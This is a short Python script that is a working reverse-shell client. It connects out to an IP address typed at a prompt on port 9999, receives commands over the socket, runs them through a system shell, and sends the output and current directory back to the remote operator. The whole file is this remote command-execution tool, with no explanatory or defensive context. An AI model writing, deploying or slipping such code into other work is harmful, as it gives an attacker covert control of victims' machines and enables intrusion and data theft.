#!/usr/bin/python

import socket
import subprocess, os
from sys import exit

s = socket.socket()
host = input("Ip: ") 

port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024).decode("utf-8")
    if len(data) > 0:
        if data[:2] == "cd":
            os.chdir(data[3:])
        elif data == "quit":
            s.close()
            exit()

        else:
            cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(f"{output_str}{ str(os.getcwd()) })>"))
            print(output_str.strip(), end='\n')
s.close()
